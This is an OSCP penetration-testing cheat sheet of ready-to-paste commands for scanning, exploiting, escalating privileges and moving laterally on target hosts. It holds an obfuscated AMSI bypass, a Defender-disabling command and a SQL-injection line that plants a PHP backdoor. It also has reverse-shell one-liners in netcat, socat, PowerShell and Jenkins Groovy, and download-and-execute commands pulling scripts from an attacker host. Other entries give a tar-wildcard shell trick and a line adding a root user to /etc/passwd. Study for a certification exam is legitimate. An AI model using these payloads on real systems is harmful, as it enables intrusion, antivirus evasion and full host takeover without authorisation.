# OSCP_cheatsheet
[Buffer overflow](bufferoverflow.md)

# Summary
* [General](#General)
* [Enumeration](#Enumeration)
   * [Enumeration Tips](#Enumeration-tips)
   * [Host Discovery](#Host-Discovery)
   * [Services](#Services)
        * [Most common ports](#Most-common-ports)
        * [Port Scanning Nmap](#port-scanning-Nmap)
   * [Web-applications](#Web-applications)
* [Exploitation](#Exploitation)
   * [Web application](#Exploitation-Web-application)
   * [FTP](#FTP)
   * [Password Attacks](#Password-Attacks)
   * [SMB and NETBIOS](#SMB-and-NETBIOS)
   * [NFS Shares](#NFS-Shares)
   * [All the Shells](#Shells)
* [Post Exploitation](#Post-Exploitation)
   * [Local privilege escalation](#Local-privilege-escalation)
        * [Windows](#Windows)
        * [Linux](#Linux)
   * [Lateral Movement](#Lateral-Movement)
    
# General
#### Python error
When receiving the error “/usr/bin/env: ‘python\r’: No such file or directory when running an python exploit.
1.	Open the python file in vim
2.	Use the command ```:set ff=unix```
3.	Save the file. ```:wq```

#### SSH key files
ssh key files needs to be permission 600
```
sudo chmod 600 <FILE>
```

#### RDP commands
```
xfreerdp /d:<DOMAIN> /u:<USERNAME> /v:<TARGET IP< +clipboard
```

## cmd
#### Find string
```
| findstr /I “<FIND STRING>”
```

#### Ignore string
```
| findstr /v “<IGNORE STRING>” 
```

## Powershell
#### Powershell flags
- ```-nop```: (```-noprofile```) which instructs powershell not to load the powershell user profile.
-	```-w hidden```: to avoid creating a window on the user’s desktop
-	```-e```: (```-EncodedCommand```) use base64 encoding

#### Start as admin
```
powershell.exe Start-Process cmd.exe -Verb runAs
```

#### AMSI Bypass
```
sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( GeT-VariaBle ( "1Q2U" +"zX" ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System' ) )."g`etf`iElD"( ( "{0}{2}{1}" -f'amsi','d','InitFaile' ),( "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
```

#### Disbale AV (Requires local admin)
```
Set-MpPreference -DisableRealtimeMonitoring $true
```

### Powershell execution policy
#### Get execution policy
```
Get-ExecutionPolicy -Scope CurrentUser
```

#### Bypass execution policy flag
```
-ExecutionPolicy Bypass
```

#### Disable execution policy
```
Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser
```

## Compiling
#### Compile on linux
```
gcc
```

#### Cross compile exploit code
```
sudo apt install mingw-64
```

#### Compile 32bit
```
i686-w64-mingw32-gcc something.c -o something
```

# Enumeration
## Host Discovery
#### NMAP ping sweep
```
sudo nmap -sn <RANGE>
```

#### Netdiscover
```
sudo netdiscover -r <RANGE>
sudo netdisover -i <INTERFACE>
```

## Services / Port Scanning
### Most common ports
```
21: ftp
22: ssh
23: telnet
25: smtp
53: domain name system
80: http
110: pop3
111: rpcbind
135: msrpc
139: netbios-ssn
143: imap
443: https
445: microsoft-ds
993: imaps
995: pop3s
1723: pptp
3306: mysql
3389: ms-wbt-server
5900: vnc
8080: http-proxy
```

### Port scanning Nmap
#### Full TCP port scan
```
nmap <TARGET> -sV -sC -O -p- -vv -oA full_tcp_-<TARGET> 
```

#### Full UDP port scan
```
nmap <TARGET> -sU -sV -sC -p- -vv -oA full_udp_-<TARGET> 
```

#### Nmap scan most common ports wiht no host discovery
```
nmap <TARGET> -p 20,21,22,25,80,443,111,135,139,443,8080 -oA portsweep-<TARGET> 
nmap <TARGET> --top-ports 25 -oA portsweep_top25-<TARGET> 
```

#### Nmap scan all vulnerabilities
```
nmap <TARGET> -p- --script vuln -vv -oA vulnscan_-<TARGET> 
```

#### Usefull flags
- ```-Pn``` No ping #use if host says down but you know its up)
- ```-sn``` No port scan #use if you just want to scan a range to check if hosts are up.

#### HTTP Openproxy
If there is an open HTTP proxy, connect to it by configuring a proxy in your browser.

## Web-applications
- Check the file extensions in URL’s to see what the application is running (.net .aspx .php etc)
- Inspect page content
- Check Firefox debugger for outdated javascript libraries
- Look for /robots.txt and /sitemap.xml

#### Find subdomains from html pages
```
curl <WEBPAGE>
grep -o '[^/]*\.<DOMAIN>\.com' index.html | sort -u > subdomains.txt
```

#### Screenshot a lot of http pages
Collect screenshot from list of ips
```
for ip in $(cat <IP FILE>); do cutycapt --url=$ip --out=$ip.png;done
```

Run the following bash script
```
#!/bin/bash
# Bash script to examine the scan results through HTML.
echo "<HTML><BODY><BR>" > web.html
ls -1 *.png | awk -F : '{ print $1":\n<BR><IMG SRC=\""$1""$2"\" width=600><BR>"}' >> w
eb.html
echo "</BODY></HTML>" >> web.html
```

### Vulnerability scanning - Nikto
Nikto is used for vulnerability scanning a web application.
```
nikto -host <URL> -output nikto-URL.txt
```

### Directory fuzzing
#### Directory fuzzing - Dirb
Use the -R to disable recursive scanning
```
dirb <URL> /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -o dirb-<URL>.txt
dirb <URL> /usr/share/dirb/wordlists/big.txt -o dirb-<URL>.txt
```

#### Directory fuzzing - Gobuster
- use the ```-b``` flag to blacklist status codes.
```
gobuster dir -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u <URL> gobuster-<URL>.txt
gobuster dir -w /opt/SecLists/Discovery/Web-Content/big.txt -u <URL> gobuster-<URL>.txt
```

#### Usefull flags Dirb
- ```-p``` set up a proxy <IP:PORT>
- ```-X``` Append each word with this extensions.


### Wordpress
#### Scan Wordpress
```
wpscan -url <URL>
```

#### Bruteforce login
```
wpscan --url <URL> --usernames <USERNAME> --passwords /usr/share/wordlists/rockyou.txt --max-threads 50
```

#### Upload a reveare shell
1. Login --> Appearance --> Theme editor --> 404.php
2. gedit /usr/share/webshells/php/php-reverse-shell.php
3. Paste in 404.php
4. Start listener and go to an unexisting page in the browser

### Jenkings
#### Execute commands
- After login go to /script

#### Reverse java shell
```
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/<IP>/<PORT>;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

### SMTP
#### Enumerate emails accounts
```
nc -nv <IP> 25
VRFY root
VRFY idontexist
Check output
```

### Shares SMB
#### Nmap enumerate SMB shares
```
nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse <IP>
```

#### SMBClient list shares
```
smbclient -L <IP>
smbclient -L <IP>  -U '<USER>'%'<PASS>'
```

#### SMBClient connect to share
```
smbclient //<IP>/<SHARE>
```

#### SMBClient connect to share
```
smbclient //<IP>/<SHARE>
```

#### Download smb files recursively
```
get <FILE NAME>-
smbget -R smb://<IP>/<SHARE>
```

### Shares RPC
#### Nmap enumerate RPC shares
```
nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount <IP>
```

### General
#### Find dangerous HTTP methods
https://www.sans.org/reading-room/whitepapers/testing/penetration-testing-web-application-dangerous-http-methods-33945
```
curl -v -X OPTIONS http://website/directory
#HTTP options such as PUT, Delete are bad
```

# Exploitation
## Exploitation Web application
### General
When modifying web exploits, there are several key questions we generally need to ask while approaching the code:
-	Does it initiate an HTTP or HTTPS connection?
-	Does it access a web application specific path or route?
-	Does the exploit leverage a pre-authentication vulnerability?
-	If not, how does the exploit authenticate to the web application?
-	How are the GET or POST requests crafted to trigger and exploit the vulnerability?
-	Does it rely on default application settings (such as the web path of the application) that may have been changed after installation?
-	Will oddities such as self-signed certificates disrupt the exploit?

### SQL Injection
- Use ‘ and “ to look for possible errors
- use # and -- for comments after the injection.
- If returning multiple rows gives errors use ```LIMIT 1``` in the query
- use ```ORDER BY``` to find the amount of columns. Increment it by 1 till no output is shown.
- use ```load_file('C:/Windows/System32/drivers/etc/hosts')``` to load files instead of database data.
- use ```"<?php echo shell_exec($_GET['cmd']);?>" into OUTFILE '<PATH TO WEBROOT>/backdoor.php'``` to create a simple php backdoor.

#### MYSQL Commands
```
show grants;
show variables;
show databases;
use <DATABASE>;
show tables;
describe <TABLE>;
SELECT * FROM <TABLE>;
```

### File upload
#### File upload intruder extensions list
```
/opt/SecLists/Discovery/Web-Content/web-extensions.txt
```

## FTP
- Check if login is allowed as anonymous:anonymous.

## Password Attacks
https://github.com/danielmiessler/SecLists
#### Hydra bruteforce FTP
```
hydra -L <USERNAMEFILE> -P <PASSWORDFILE> -t 24 ftp://<IP>:<PORT>
```

#### Hydra bruteforce SSH
```
hydra -L <USERNAMEFILE> -P <PASSWORDFILE> -t 24 ssh://<IP>:<PORT>
```

#### Hydra bruteforce HTTP login
Login using Burp or check in developers tools to check the request for the required information! You need to get the username/password/login parameter and the error message!

https://redteamtutorials.com/2018/10/25/hydra-brute-force-https/
```
hydra -L <USERNAMEFILE> -P <PASSWORDFILE> <IP> http-post-form "<LOGINPAGE>:<COOKIES FROM BURP AND SET ^USER^ AND ^PASS^>:<ERROR MESSAGE FAILED LOGIN>"

#EXAMPLE hydra -L usernames.txt -P passwords.txt 192.168.2.62 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login Failed"

#EXAMPLE hydra -l admin -P /opt/SecLists/Passwords/xato-net-10-million-passwords-100.txt 10.10.175.0 http-post-form '/Account/login.aspx?ReturnURL=/admin:__VIEWSTATE=u8hdjDohYmqfI8o0z7Cev4b1u0jLmv9dNA9NS95wDsZeMYw6zBFeyhiLx1QuOsZ%2FXV%2Fo%2BrCdXSC4Y7%2FueaRnmboaQQ9KZQWLME84zysowmYTAW8Kea1%2Bp7phoEwMiICbLwPPteDEYl7z6nobm8x1Mb2hMDiTpDJhracgmTh%2BJwP1Rqqt&__EVENTVALIDATION=QJmkftZnDEcQIPsstxYKnQBDsulZLsB0kmrbMa4BPzAc%2FMEDChrOmztni5OWBx83r2xGNndCAgw6wJ%2F%2FoAzYtZEcyRWC%2FaPyUR5iWSO0V8%2FIodobow1OxiuoD9uZVnVO8tcQZr3NWYjFcOVxYg5WAWvPyezvfcBk2oxUdZwsutPATiKB&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:failed'
```

#### CEWL - Create a wordlist 
```
cewl <URL> -m <MIN CHARS> -w <FILE>.txt
```

#### Identify hashes
```
hashid <HAS>
hash-identiefier
```

#### Combine /etc/passwd and /etc/shadow with unshadow
```
Unshadow <PASSWD FILE> <SHADOW FILE> > unshadow.txt
```

## SMB and NETBIOS
NetBIOS is an independent session layer protocol and service that allows computers on a local network to communicate with each other. While modern implementations of SMB can work without NetBIOS, NetBIOS over TCP (NBT)211 is required for backward compatibility and is often enabled together.

#### NBTSCAN
```
sudo nbtscan -r <IP RANGE>
```

#### Nmap SMB Script
```
/usr/share/nmap/scripts/smb*
```

## NFS Shares
Portmapper and RPCBind run on TCP port 111

#### Enumerations
```
rpcinfo irked.htb
nmap -sSUC -p111 <IP>
```

#### Mount shares
```
sudo mount -o nolock <IP>:/<SHARE> <MOUNT LOCATION>
sudo mount -t cifs -o port=<PORT> //<IP>/<SHARE> -o username=<USERNAME>,password=<PASSWORD> /mnt/<FOLDER>
```

#### Open file with no permission to file
If a file found which we want to access but don’t have permissions. Make a user with the same username and change the UUID, change to the user so we can access the file.
```
sudo adduser pwn
sudo vim /etc/passwd
```

## Shells
### Listeners
#### Netcat listener
```
sudo nc -nlvp <PORT>
```

#### Socat listener
```
sudo socat -d -d TCP4-LISTEN:<PORT> STDOUT
```

#### Meterpreter listener
```
msfconsole
use multi/handler
set payload <PAYLOAD>
run
```

#### Powercat listener
```
. ./powercat.ps1
powercat -l -v -p 10000
```

### Reverse shells
#### Netcat
```
nc -nv <IP> <PORT> -e /bin/bash
```

#### Socat
```
socat TCP4:10.11.0.22:443 EXEC:/bin/bash
```

#### Powershell
```
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<IP>',<PORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i =$stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

```
powershell.exe iex (iwr http://<IP>/Invoke-PowerShellTcp.ps1 -usebasicparsing);Invoke-PowerShellTcp -Reverse -IPAddress <IP> -Port <PORT>
```

```
powershell iex (New-Object Net.WebClient).DownloadString('http://<IP>/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress <IP> -Port <PORT>
```

#### Powercat
```
powercat -c <IP> -p <PORT> -e cmd.exe
```

### Bind shells
#### Netcat
```
nc -nlvp <PORT>
```

#### Powershell
```
powershell -c "$listener = New-Object System.Net.Sockets.TcpListener('<IP>',<PORT>);$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'P
```

#### Powercat
```
powercat -l -p <PORT> -e cmd.exe
```

### Spawn TTY Shells
```
python -c 'import pty; pty.spawn("/bin/sh")'
```

```
echo os.system('/bin/bash')
```

```
/bin/sh -i
```

```
perl —e 'exec "/bin/sh";'
```

```
perl: exec "/bin/sh";
```

```
ruby: exec "/bin/sh"
```

# Post Exploitation
## Local privilege escalation
Exploit binaries
- Linux https://gtfobins.github.io/
- Windows https://lolbas-project.github.io/

Static binaries
- https://github.com/andrew-d/static-binaries

### Windows
- Windows check if Windows Scheduler is running (```tasklist```)
  - Go to C:\Program files (x65)\SystemScheduler\Events and check the logs to see if anything is running every x minutes.
  - Check if we got write permissions

#### Powerup unqouted service path
https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1

- Check for something we can restart and generate payload:
- MSF venom generate exe
  - ```msfvenom -p windows/shell_reverse_tcp LHOST=<HOST> LPORT=<PORT> -e x86/shikata_ga_nai -f exe -o <NAME>.exe```
- Upload to host in the unqouted servicepath (if path is C:\Program Files\pro ftp) upload it as C:\Program Files\pro.exe
- Restart service in powershell. 
-   ```restart-service  <SERVICE>```

#### Check the current user
```
whoami
```

#### Check all the users
```
net user
```

#### Check hostname
```
hostname
```

#### Check operatingsystem and architecture
```
systeminfo
```

#### Check Running processes
```
tasklist /svc
```

#### Check running services
```
wmic service get name,displayname,pathname,startmode
```

#### Check permission on file
```
icalcs "<PATH>"
```

#### Check current privileges
```
whoami /priv; whoami /groups
```
if SeImpersonatePrivilege is set (https://github.com/itm4n/PrintSpoofer or juicypotato)

#### Check networking information
```
ipconfig /all
route print
```

#### Check open ports
```
netstat -ano
```

#### Enumerate firewall
```
netsh advfirewall show currentprofile
netsh advfirewall firewall show rule name=all
```

#### Enumerate scheduled task
```
schtasks /query /fo LIST /v
```

#### Installed applications and patch levels
```
wmic product get name, version, vendor
```

#### Readable/writable files and directories
```
accesschk.exe -uws "Everyone" "C:\Program Files"
Get-ChildItem "C:\Program Files" -Recurse | Get-ACL | ?{$_.AccessToString -match "Everyone\sAllow\s\sModify"}
```

#### Unmounted disks
```
cat /etc/fstab
mount
/bin/lsblk
mountvol
```

#### Device drivers and kernal modules
```
driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object ‘Display Name’, ‘Start Mode’, Path
Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, DriverVersion, Manufacturer | Where-Object {$_.DeviceName -like "*<DRIVER>*"}
```

#### Binaries that auto elevate
Check status of AlwaysInstalledElevated registery setting (if yes then craft a MSI)
```
reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer
```

#### Check the architecture
```
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
```

#### Check for drivers
```
driverquery /v
```

#### Check the driver files for version etc and check if it’s vulnerable
```
cd C:\Program Files\<DRIVER>
```

### Linux
#### Check the current user
```
whoami; id
```

#### Check all the users
```
cat /etc/passwd
```

#### Check hostname
```
hostname
```

#### Check operatingsystem and architecture
```
cat /etc/*release*; cat /etc/*issue*; uname -a; arch
```

#### Check Running processes
```
ps aux
```

#### Check current privileges
```
sudo -l
```

#### Check networking information
```
ifconfig
ip a
routel
```

#### Check open ports
```
netstat -tulpn
```

#### Enumerate firewall
```
cat etc/iptables/*
```

#### Enumerate scheduled task
```
cat /etc/crontab; ls -lah /etc/cron*
```

#### Installed applications and patch levels
```
dpkg -l
```

#### Readable/writable files and directories
```
find / -writable -type d 2>/dev/null
```

#### Unmounted disks
```
cat /etc/fstab
mount
/bin/lsblk
mountvol
```

#### Device drivers and kernal modules
```
lsmod
/sbin/modinfo <MODULE>
```

#### Find suit bits
```
find / -perm -u=s -type f 2>/dev/null
```

If a binary has a SUID and doesn’t use full path for executing something, you can manipulate the path to run another binary (/bin/sh).
- echo /bin/bash > /tmp/curl
- chmod 777 /tmp/curl
- export PATH=/tmp:$PATH
- <path to binary>

#### Run SUID BIT
Use the following instead of just sudo <PROGRAM>
```
sudo -u root <PATH TO PROGRAM> #manier1
./.suid_bash -p #manier2
```
  
#### Wildcard privileges
Exploiting wildcard for privilege escalation (For example tar * in this directory) https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/
```
echo "mkfifo /tmp/lhennp; nc <IP> <PORT> 0</tmp/lhennp | /bin/sh >/tmp/lhennp 2>&1; rm /tmp/lhennp" > shell.sh
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" > --checkpoint=1
```
  
### Privesc Linux Tricks
#### Write to /etc/passwd
```
openssl passwd <PASS> #generate password
echo "root2:<OPENSSL OUTPUT>:0:0:root:/root:/bin/bash" >> /etc/passwd
su root2 #sudo to root with the password set
```

## File transfers
### Download files
#### Start webservers
```
sudo service apache2 start #files in /var/www/html
sudo python3 -m http.server <PORT> #files in current 
sudo python2 -m SimpleHTTPServer <PORT>
sudo php -S 0.0.0.0:<PORT>
sudo ruby -run -e httpd . -p <PORT>
sudo busybox httpd -f -p <PORT>
```

#### Download file from webserver
```
wget http://<IP>:<PORT>/<FILE>
```

#### SMB Server
```
sudo python3 /opt/oscp/impacket/examples/smbserver.py <SHARE NAME> <PATH>
```

#### Look for files in SMB
```
dir \\<IP>\<SHARE NAME>
```

#### Copy files in SMB
```
copy \\<IP>\<SHARE NAME>\<FILE NAME>
```

#### Linux ftp
```
If installed use the ftp package
```

#### Windows ftp
Use native program with the -s parameter to use a input file for the commands
```
echo open <IP> 21> ftp.txt
echo USER <USER> >> ftp.txt
echo lab>> ftp.txt
echo bin >> ftp.txt
echo GET nc.exe >> ftp.txt
echo bye >> ftp.txt
```

#### VBS download files for Windows XP
Create vbs script
```
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo http.Open "GET", strURL, False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs
echo Next >> wget.vbs
echo ts.Close >> wget.vbs
```

Run VBS script to download file
```
cscript wget.vbs http://<IP>/<FILE> <FILE>
```

#### Powershell download file
```
powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://<IP>/<FILE>', '<FILE>')
```
```
powershell -c "Invoke-WebRequest -Uri 'http://<IP>/<FILE>' -OutFile 'C:\Windows\Temp\<FILE>'"
```

### Upload files
#### Netcat listener for file
```
nc -nlvp 4444 > <FILE>
```

#### Netcat send file
```
nc -nv 10.11.0.22 4444 <FILE>
```

#### Socat listener for file
```
sudo socat TCP4-LISTEN:<PORT>,fork file:<FILE>
```

#### Socat send file
```
socat TCP4:<IP>:<PORT> file:<FILE>,create
```

#### Powercat send file
```
powercat -c <IP> -p <PORT> -i <FILE>
```

#### Upload Windows data through HTTP Post request
make /var/www/upload.php on kali
```
<?php
$uploaddir = '/var/www/';
$uploadfile = $uploaddir . $_FILES['file']['name'];
move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)
?>
```

Upload file in Windows client
```
powershell (New-Object System.Net.WebClient).UploadFile('http://<IP>/upload.php', '<FILE>')
```

#### Upload through tftp (over udp)
Install tftp on kali
```
sudo apt update && sudo apt install atftp
sudo mkdir /tftp
sudo chown nobody: /tftp
sudo atftpd --daemon --port 69 /tftp
```

On windows client to send file
```
tftp -i 10.11.0.4 put important.docx
```

#### Powercat send file
```
powercat -c <IP> -p <PORT> -i <FILE>
```

## Lateral movement
### Local Port forwarding
#### Port forwarding rinetd
```
apt install rinetd
cat /etc/rinetd.conf
```

#### SSH local port forward
```
ssh -N -L <LOCAP ORT>:127.0.0.1:<TARGET PORT> <USERNAME>@<TARGET IP>
```

#### SSH port forwarding over hop
```
ssh -N -L <BIND_ADRESS>:<PORT>:<TARGET IP>:<TARGET PORT> <USERNAME>@<HOP IP>
```
### Remote port forwarding
#### SSH forward local port of target back to our kali
```
ssh -N -R <BIND_ADRESS>:<PORT>:127.0.0.1:<TARGET PORT> <USERNAME>@<IP>
```

### Dynamic port forwarding
```
sudo ssh -N -D 127.0.0.1:9000 <username>@<IP>
vim  /etc/proxychains.conf
socks4		127.0.0.1 9000 #Change this value
#prepend proxychains command before every command to send through the proxychain.
```

####
```

```

####
```

```

####
```

```

####
```

```

####
```

```

####
```

```

####
```

```

####
```

```

####
```

```

